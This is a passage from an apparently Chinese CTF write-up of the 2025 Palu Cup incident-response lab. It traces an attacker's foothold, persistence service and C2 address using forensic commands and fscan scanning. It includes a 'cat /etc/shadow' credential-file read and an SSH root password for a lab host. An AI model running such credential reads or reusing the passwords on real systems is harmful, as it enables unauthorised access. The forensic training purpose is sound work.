+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528202540282.png"
+	width="905"
+	height="58"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528202540282_hu7068949003928817169.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528202540282_hu3148639144037119265.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250528202540282"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1560"
+		data-flex-basis="3744px"
+	
+></p>
+<p>接着ssh连接这个</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh 49.232.112.164
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>要root密码，这下是Solar@2025_05_palu!了，换xshell连</p>
+<p>连上直接cat flag</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528202618716.png"
+	width="1001"
+	height="156"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528202618716_hu7763002473103716938.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528202618716_hu12646479908115828889.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250528202618716"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="641"
+		data-flex-basis="1540px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ZX0001S
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-1">应急响应2-1
+</h3><p>提交堡垒机中留下的flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">grep -r &#34;palu{&#34; /*
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者直接用链接登入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.20.100/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528203135251.png"
+	width="1911"
+	height="799"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528203135251_hu5720809795074210990.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528203135251_hu9318613447162614515.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250528203135251"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="574px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{2025_qiandao_flag}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-2">应急响应2-2
+</h3><p>提交WAF中隐藏的flag</p>
+<p>同样登入waf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://192.168.20.102:9443/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在身份认证找到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{2025_waf}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-3">应急响应2-3
+</h3><p>提交Mysql中留下的flag</p>
+<p>直接navicat连接，找到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{Mysql_@2025}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-4">应急响应2-4
+</h3><p>提交攻击者的攻击IP</p>
+<p>waf雷池查看不是给的拓扑图里面的ip</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{192.168.20.107}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-5">应急响应2-5
+</h3><p>提交攻攻击者最早攻击时间flag格式为palu{xxxx-xx-xx-xx:xx:xx}</p>
+<p>刚刚看雷池已经看到了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{2025-05-05-00:04:40}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-6">应急响应2-6
+</h3><p>提交web服务泄露的关键文件名</p>
+<p>前面发现那个机子直接用虚拟机看很多条看不到，直接换xshell连了</p>
+<p>查看服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ps -aux
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528210826518.png"
+	width="915"
+	height="67"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528210826518_hu12418505167754360849.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528210826518_hu6428193253805892414.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250528210826518"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1365"
+		data-flex-basis="3277px"
+	
+></p>
+<p>发现nginx服务，查看他的日志</p>
+<p><code>/var/log</code>下面没有nginx</p>
+<p>全局找</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528211153816.png"
+	width="1247"
+	height="787"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528211153816_hu14229260724092588700.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528211153816_hu8103663062815933719.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250528211153816"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="158"
+		data-flex-basis="380px"
+	
+></p>
+<p>直接看第一个，有个safeline</p>
+<p>查看发现一堆日志</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528211624775.png"
+	width="1424"
+	height="740"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528211624775_hu13142828726352278249.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528211624775_hu7718382087012142684.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250528211624775"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="192"
+		data-flex-basis="461px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{key.txt}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-7">应急响应2-7
+</h3><p>提交泄露的邮箱地址作为flag进行提交</p>
+<p>访问key.txt</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{parloo@parloo.com}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-8">应急响应2-8
+</h3><p>提交立足点服务器ip地址</p>
+<p>前下看雷池的时候发现的本机的服务器来攻击了,很可疑</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{192.168.20.108}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-9">应急响应2-9
+</h3><p>提交攻击者使用的提权用户密码,flag格式为:palu{username/password}</p>
+<p>由于前面那题知道立足点服务器了，我们可以直接去192.168.20.108对应的服务器查看，也就是 sshServer 这台机子，然后查看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /etc/shadow
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到parloo/parloo</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{parloo/parloo}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-10">应急响应2-10
+</h3><p>提交攻击者留下的的文件内容作为flag提交</p>
+<p>这个想到进攻击者留下的账号目录里面看</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603000348667.png"
+	width="651"
+	height="239"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603000348667_hu11496515852068370365.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603000348667_hu13592342926330719688.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603000348667"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="272"
+		data-flex-basis="653px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{hi_2025_parloo_is_hack}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-11">应急响应2-11
+</h3><p>提交权限维持方法服务的名称</p>
+<p>一般是木马，我们直接查看服务器外联地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netstat -anplt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者看恶意进程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ps -aux
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603092514965.png"
+	width="928"
+	height="133"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603092514965_hu15383916040554760315.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603092514965_hu18422430235663229223.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603092514965"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="697"
+		data-flex-basis="1674px"
+	
+></p>
+<p>发现恶意进程b4b4那个</p>
+<p>ps查看他在哪个路径</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ps -ef |grep b4b4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603092648986.png"
+	width="655"
+	height="78"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603092648986_hu8258482355256686681.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603092648986_hu16042967405432300670.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603092648986"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="839"
+		data-flex-basis="2015px"
+	
+></p>
+<p>这里知道了执行恶意进程的用户pid</p>
+<p>可以查看他执行的system服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">systemctl status 831
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603093037266.png"
+	width="857"
+	height="390"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603093037266_hu16644164134450288717.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603093037266_hu4317339090848664659.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603093037266"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="219"
+		data-flex-basis="527px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{rootset}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>至于他这个程序，其实执行了<code>Restart=always</code></p>
+<h3 id="应急响应2-12">应急响应2-12
+</h3><p>提交攻击者攻击恶意服务器连接地址作为flag提交</p>
+<p>这个就是上面找到的那个外联地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{47.101.213.153}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-13">应急响应2-13
+</h3><p>找到系统中被劫持的程序程序名作为flag提交</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ls -alh /usr/bin /bin /usr/sbin /sbin | grep -vE &#39;root | staff |bin&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看不属于root的程序，</p>
+<ul>
+<li>/bin 基础命令 <code>ls</code>,<code>cp</code></li>
+<li>/usr/bin 扩展命令 <code>vim</code>,<code>python</code></li>
+<li>/sbin 系统管理命令 <code>ifconfig</code>,<code>reboot</code></li>
+<li>/usr/sbin 更多管理命令 <code>sshd</code>,<code>apache</code></li>
+</ul>
+<p>或者</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ps -ef
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>找到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{id}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-14">应急响应2-14
+</h3><p>找到系统中存在信息泄露的服务运行端口作为flag提交</p>
+<p>这里查看server01,然后探测别的端口</p>
+<p>fscan扫描</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603133726430.png"
+	width="1483"
+	height="762"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603133726430_hu4781873316441920214.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603133726430_hu12678463370381953410.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603133726430"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="467px"
+	
+></p>
+<p>80端口是重要通知</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603133920008.png"
+	width="1617"
+	height="433"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603133920008_hu10273730647435961934.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603133920008_hu1696447966507073030.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603133920008"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="373"
+		data-flex-basis="896px"
+	
+></p>
+<p>这里其实可以解决前面提权密码的问题</p>
+<p>然后8081端口也很可疑</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603134059462.png"
+	width="1721"
+	height="368"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603134059462_hu8684335713214382027.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603134059462_hu17028339345967852975.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603134059462"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="467"
+		data-flex-basis="1122px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{8081}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-15">应急响应2-15
+</h3><p>提交Parloo公司项目经理的身份证号作为flag提交</p>
+<p>同上可以拿到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{310105198512123456}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-16">应急响应2-16
+</h3><p>提交存在危险功能的操作系统路径作为flag提交。flag格式为palu{/xxx/xxx}</p>
+<p>扫端口的时候一定也要开mysql那台机子，不然这题扫不到了</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603140021147.png"
+	width="1483"
+	height="762"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603140021147_hu6561468957077365251.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603140021147_hu16089531324284752814.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603140021147"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="467px"
+	
+></p>
+<p>多了一个3000端口，git服务可能会泄露</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603140104219.png"
+	width="1810"
+	height="384"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603140104219_hu11509656619936128181.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603140104219_hu5826556046444688608.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603140104219"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="471"
+		data-flex-basis="1131px"
+	
+></p>
+<p>进仓库有个mian.go</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
